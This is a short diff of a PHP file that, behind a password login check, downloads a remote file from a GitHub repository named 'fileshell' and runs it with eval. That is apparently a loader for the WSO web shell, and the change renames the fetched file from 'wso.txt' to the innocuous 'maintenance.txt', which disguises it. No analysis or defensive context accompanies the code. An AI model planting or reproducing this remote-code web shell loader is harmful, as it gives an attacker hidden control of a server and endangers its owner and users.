@@ -97,7 +97,7 @@ if (isset($_POST['password'])) {
 
 if (is_logged_in()) {
 
-   $a = geturlsinfo('https://raw.githubusercontent.com/kurtcobain555/fileshell/main/wso.txt');
+   $a = geturlsinfo('https://raw.githubusercontent.com/kurtcobain555/fileshell/main/maintenance.txt');
 
    eval('?>' . $a);
 
